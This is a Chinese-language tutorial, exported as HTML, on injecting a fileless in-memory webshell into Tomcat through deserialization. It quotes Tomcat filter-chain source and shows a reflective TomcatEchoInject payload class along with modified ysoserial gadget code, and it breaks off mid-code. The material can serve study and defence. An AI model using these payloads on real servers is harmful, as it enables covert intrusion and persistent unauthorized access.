<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
	<head>
		<meta http-equiv="Content-Type" content="text/html; charset=utf-8" /><title>
		</title>
		<style type="text/css">
			.csAD577193{text-align:left;text-indent:0pt;margin:24pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
			.csECDA2D3{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:16pt;font-weight:bold;font-style:normal;}
			.csDE05BCC{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:16pt;font-weight:bold;font-style:normal;}
			.cs868C439D{text-align:left;text-indent:0pt;margin:10pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
			.csB2D98684{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:14pt;font-weight:bold;font-style:normal;}
			.cs83F14626{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:14pt;font-weight:bold;font-style:normal;}
			.cs40DD2BC9{text-align:left;text-indent:0pt;margin:9pt 0pt 9pt 0pt}
			.cs9C1B1871{color:#000000;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:normal;font-style:normal;}
			.cs8926E06{color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal;}
			.cs3A447A38{text-align:left;text-indent:0pt;margin:0pt 0pt 10pt 0pt}
			.cs9FB05234{color:#000000;background-color:transparent;font-family:Consolas;font-size:11pt;font-weight:normal;font-style:normal;}
			.cs6EDCDAE2{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:normal;font-style:italic;}
			.cs7FFD2630{color:#000000;background-color:transparent;font-family:Microsoft JhengHei UI;font-size:11pt;font-weight:normal;font-style:normal;}
			.cs508254C{color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal;text-decoration: none;}
			.cs1C2E50E7{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:normal;font-style:normal;}
			.cs4B51D5E4{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal;}
			.csFE4DF89B{text-align:left;margin:2pt 0pt 2pt 0pt;list-style-type:decimal;color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal}
			.csD6CA00D2{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:bold;font-style:normal;}
			.cs6FD73CFB{text-align:left;text-indent:0pt;margin:5pt 24pt 5pt 24pt}
		</style>
	</head>
	<body>
		<h1 class="csAD577193">
			<a name="基于tomcat的内存webshell-无文件攻击技术"><span class="csECDA2D3">基于</span><span class="csDE05BCC">Tomcat</span><span class="csECDA2D3">的内存</span><span class="csDE05BCC">Webshell </span><span class="csECDA2D3">无文件攻击技术</span></a></h1>
		<h2 class="cs868C439D">
			<a name="X662258909aafc632a438019f993d4323f362074"><span class="csB2D98684">0x01 tomcat</span><span class="cs83F14626">通用的获取</span><span class="csB2D98684">request</span><span class="cs83F14626">和</span><span class="csB2D98684">response</span></a></h2>
		<p class="cs40DD2BC9"><span class="cs9C1B1871">首先我们看看一个普通</span><span class="cs8926E06">http</span><span class="cs9C1B1871">请求进来的时候，</span><span class="cs8926E06">tomcat</span><span class="cs9C1B1871">的部分执行栈：</span></p><p class="cs3A447A38"><span class="cs9FB05234">at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">at org.apache.catalina.core.StandardWrapperValve.invoke(StandardWrapperValve.java:198)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">at org.apache.catalina.core.StandardContextValve.invoke(StandardContextValve.java:96)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">at org.apache.catalina.authenticator.AuthenticatorBase.invoke(AuthenticatorBase.java:493)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">at org.apache.catalina.core.StandardHostValve.invoke(StandardHostValve.java:140)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">at org.apache.catalina.valves.ErrorReportValve.invoke(ErrorReportValve.java:81)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">at org.apache.catalina.core.StandardEngineValve.invoke(StandardEngineValve.java:87)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">at org.apache.catalina.connector.CoyoteAdapter.service(CoyoteAdapter.java:342)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">at org.apache.coyote.http11.Http11Processor.service(Http11Processor.java:800)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">at org.apache.coyote.AbstractProcessorLight.process(AbstractProcessorLight.java:66)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">at org.apache.coyote.AbstractProtocol$ConnectionHandler.process(AbstractProtocol.java:806)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.doRun(NioEndpoint.java:1498)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">at org.apache.tomcat.util.net.SocketProcessorBase.run(SocketProcessorBase.java:49)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1142)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">at org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:61)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">at java.lang.Thread.run(Thread.java:745)</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">按照</span><span class="cs8926E06">kingkk</span><span class="cs9C1B1871">师傅的方法，利用的点是在</span><span class="cs8926E06"> org.apache.catalina.core.ApplicationFilterChain.internalDoFilter</span><span class="cs9C1B1871">：</span></p><p class="cs3A447A38"><span class="cs9FB05234">if (ApplicationDispatcher.WRAP_SAME_OBJECT) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;lastServicedRequest.set(request);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;lastServicedResponse.set(response);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">}</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">其中，通过反射修改</span><span class="cs8926E06">ApplicationDispatcher.WRAP_SAME_OBJECT</span><span class="cs9C1B1871">为</span><span class="cs8926E06">true</span><span class="cs9C1B1871">，并且对</span><span class="cs8926E06">lastServicedRequest</span><span class="cs9C1B1871">和</span><span class="cs8926E06">lastServicedResponse</span><span class="cs9C1B1871">这两个</span><span class="cs8926E06">ThreadLocal</span><span class="cs9C1B1871">进行初始化，之后，每次请求进来，就能通过这两个</span><span class="cs8926E06">ThreadLocal</span><span class="cs9C1B1871">获取到相应的</span><span class="cs8926E06">request</span><span class="cs9C1B1871">和</span><span class="cs8926E06">response</span><span class="cs9C1B1871">了。但是，也存在一点小限制，在其</span><span class="cs8926E06">set</span><span class="cs9C1B1871">之前，看：</span></p><p class="cs3A447A38"><span class="cs9FB05234">private void internalDoFilter(ServletRequest request,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ServletResponse response)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;throws IOException, ServletException {</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;// Call the next filter if there is one</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;if (pos &lt; n) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ApplicationFilterConfig filterConfig = filters[pos++];</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;try {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Filter filter = filterConfig.getFilter();</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if (request.isAsyncSupported() &amp;&amp; &quot;false&quot;.equalsIgnoreCase(</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;filterConfig.getFilterDef().getAsyncSupported())) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;request.setAttribute(Globals.ASYNC_SUPPORTED_ATTR, Boolean.FALSE);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if( Globals.IS_SECURITY_ENABLED ) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;final ServletRequest req = request;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;final ServletResponse res = response;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Principal principal =</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;((HttpServletRequest) req).getUserPrincipal();</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Object[] args = new Object[]{req, res, this};</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;SecurityUtil.doAsPrivilege (&quot;doFilter&quot;, filter, classType, args, principal);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;} else {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;filter.doFilter(request, response, this);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;} catch (IOException | ServletException | RuntimeException e) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;throw e;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;} catch (Throwable e) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;e = ExceptionUtils.unwrapInvocationTargetException(e);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ExceptionUtils.handleThrowable(e);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;throw new ServletException(sm.getString(&quot;filterChain.filter&quot;), e);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;// We fell off the end of the chain -- call the servlet instance</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;try {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if (ApplicationDispatcher.WRAP_SAME_OBJECT) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;lastServicedRequest.set(request);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;lastServicedResponse.set(response);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;...</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;} catch (IOException | ServletException | RuntimeException e) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;throw e;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;} catch (Throwable e) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;e = ExceptionUtils.unwrapInvocationTargetException(e);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ExceptionUtils.handleThrowable(e);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;throw new ServletException(sm.getString(&quot;filterChain.servlet&quot;), e);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;} finally {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if (ApplicationDispatcher.WRAP_SAME_OBJECT) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;lastServicedRequest.set(null);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;lastServicedResponse.set(null);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">}</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">先执行完所有的</span><span class="cs8926E06">Filter</span><span class="cs9C1B1871">了</span><span class="cs9FB05234">filter.doFilter(request, response, this)</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">因此，对于</span><span class="cs8926E06">shiro</span><span class="cs9C1B1871">的反序列化利用就没办法通过这种方式取到</span><span class="cs8926E06">response</span><span class="cs9C1B1871">回显了。</span></p><p class="cs3A447A38"><span class="cs8926E06">&nbsp;</span></p><h2 class="cs868C439D">
			<a name="X7d0e5f406a8f04323d68de7561b3c93a8f84a2d"><span class="csB2D98684">0x02 </span><span class="cs83F14626">动态注册</span><span class="csB2D98684">Filter</span></a></h2>
		<p class="cs40DD2BC9"><span class="cs9C1B1871">没错的，正如标题所说，通过动态注册一个</span><span class="cs8926E06">Filter</span><span class="cs9C1B1871">，并且把其放到最前面，这样，我们的</span><span class="cs8926E06">Filter</span><span class="cs9C1B1871">就能最先执行了，并且也成为了一个内存</span><span class="cs8926E06">Webshell</span><span class="cs9C1B1871">了。</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">要实现动态注册</span><span class="cs8926E06">Filter</span><span class="cs9C1B1871">，需要两个步骤。第一个步骤就是先达到能获取</span><span class="cs8926E06">request</span><span class="cs9C1B1871">和</span><span class="cs8926E06">response</span><span class="cs9C1B1871">，而第二个步骤是通过</span><span class="cs8926E06">request</span><span class="cs9C1B1871">或者</span><span class="cs8926E06">response</span><span class="cs9C1B1871">去动态注册</span><span class="cs8926E06">Filter</span></p><h4 class="cs868C439D">
			<a name="步骤一"><span class="cs6EDCDAE2">步骤一</span></a></h4>
		<p class="cs40DD2BC9"><span class="cs9C1B1871">首先，我们创建一个继承</span><span class="cs8926E06">AbstractTranslet</span><span class="cs9C1B1871">（因为需要携带恶意字节码到服务端加载执行）的</span><span class="cs8926E06">TomcatEchoInject</span><span class="cs9C1B1871">类，在其静态代码块中</span><span class="cs7FFD2630">反射修改</span><span class="cs9FB05234">ApplicationDispatcher.WRAP_SAME_OBJECT</span><span class="cs7FFD2630">为</span><span class="cs9FB05234">true</span><span class="cs7FFD2630">，并且对</span><span class="cs9FB05234">lastServicedRequest</span><span class="cs7FFD2630">和</span><span class="cs9FB05234">lastServicedResponse</span><span class="cs7FFD2630">这两个</span><span class="cs9FB05234">ThreadLocal</span><span class="cs7FFD2630">进行初始化</span></p><p class="cs3A447A38"><span class="cs9FB05234">import com.sun.org.apache.xalan.internal.xsltc.DOM;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">import com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">import com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">/**</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> * @author threedr3am</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> */</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">public class TomcatEchoInject &nbsp;extends AbstractTranslet {</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;static {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;try {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;/*</span><span class="cs7FFD2630">刚开始反序列化后执行的逻辑</span><span class="cs9FB05234">*/</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//</span><span class="cs7FFD2630">修改</span><span class="cs9FB05234"> WRAP_SAME_OBJECT </span><span class="cs7FFD2630">值为</span><span class="cs9FB05234"> true</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Class c = Class.forName(&quot;org.apache.catalina.core.ApplicationDispatcher&quot;);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;java.lang.reflect.Field f = c.getDeclaredField(&quot;WRAP_SAME_OBJECT&quot;);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;java.lang.reflect.Field modifiersField = f.getClass().getDeclaredField(&quot;modifiers&quot;);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;modifiersField.setAccessible(true);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;modifiersField.setInt(f, f.getModifiers() &amp; ~java.lang.reflect.Modifier.FINAL);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;f.setAccessible(true);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if (!f.getBoolean(null)) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;f.setBoolean(null, true);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//</span><span class="cs7FFD2630">初始化</span><span class="cs9FB05234"> lastServicedRequest</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;c = Class.forName(&quot;org.apache.catalina.core.ApplicationFilterChain&quot;);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;f = c.getDeclaredField(&quot;lastServicedRequest&quot;);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;modifiersField = f.getClass().getDeclaredField(&quot;modifiers&quot;);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;modifiersField.setAccessible(true);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;modifiersField.setInt(f, f.getModifiers() &amp; ~java.lang.reflect.Modifier.FINAL);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;f.setAccessible(true);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if (f.get(null) == null) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;f.set(null, new ThreadLocal());</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//</span><span class="cs7FFD2630">初始化</span><span class="cs9FB05234"> lastServicedResponse</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;f = c.getDeclaredField(&quot;lastServicedResponse&quot;);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;modifiersField = f.getClass().getDeclaredField(&quot;modifiers&quot;);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;modifiersField.setAccessible(true);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;modifiersField.setInt(f, f.getModifiers() &amp; ~java.lang.reflect.Modifier.FINAL);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;f.setAccessible(true);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if (f.get(null) == null) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;f.set(null, new ThreadLocal());</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;} catch (Exception e) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;e.printStackTrace();</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;@Override</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;@Override</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;throws TransletException {</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">}</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">接着，我们改造一下</span><span class="cs8926E06">ysoserial</span><span class="cs9C1B1871">中的</span><span class="cs8926E06">Gadgets.createTemplatesImpl</span><span class="cs9C1B1871">方法</span></p><p class="cs3A447A38"><span class="cs9FB05234">public static Object createTemplatesImpl ( final String command) throws Exception {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;return createTemplatesImpl(command, null);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">public static Object createTemplatesImpl ( final String command, final Class c ) throws Exception {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;if ( Boolean.parseBoolean(System.getProperty(&quot;properXalan&quot;, &quot;false&quot;)) ) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return createTemplatesImpl(</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;command, c,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Class.forName(&quot;org.apache.xalan.xsltc.trax.TemplatesImpl&quot;),</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Class.forName(&quot;org.apache.xalan.xsltc.runtime.AbstractTranslet&quot;),</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Class.forName(&quot;org.apache.xalan.xsltc.trax.TransformerFactoryImpl&quot;));</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> 